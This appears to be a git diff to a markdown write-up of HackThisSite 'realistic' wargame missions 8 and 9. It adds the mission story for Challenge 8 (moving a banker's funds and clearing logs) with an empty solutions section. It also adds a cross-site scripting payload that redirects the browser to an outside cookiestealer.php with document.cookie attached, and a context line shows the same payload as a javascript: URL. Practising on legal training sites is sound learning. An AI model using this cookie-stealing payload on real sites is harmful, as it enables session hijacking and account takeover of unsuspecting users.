@@ -1,3 +1,15 @@
+# Challenge 8
+## Question
+From: DarkOneWithANeed
+
+Message: Hey man, you gotta help me out, Gary Hunter, one of the richest men in America, has just deposited $10,000,000 into his bank account at the United Banks Of America and plans to donate that money to a campaign to hunt down and lock up all hackers. Now I've tried hacking their <a href="https://www.hackthissite.org/missions/realistic/8/">site</a> but I'm just not good enough. That's why I need your help, Here's a list of your objectives:
+1. Find the account of Gary Hunter (I don't know his account name).
+2. Move the $10,000,000 into the account dropCash.
+3. Clear The Logs, They're held in the folder 'logFiles'.
+I really hope you can do this, because if you can't we're all screwed
+
+## Solutions
+
 # Challenge 9
 ## Question
 From:
@@ -28,3 +40,7 @@ Message : javascript:void(window.location="www.yourwebsite.com/cookiestealer.php
 7. Go to mailing list, switch the txt files in inspection to logs.txt and paste the IP address.
 
 ![image](https://github.com/user-attachments/assets/ca2f8d19-1da1-4253-80d6-6cbd3779e294)
+
+## Cross-Site Scripting (XSS) attack
+
+window.location="www.yourwebsite.com/cookiestealer.php + document.cookie"
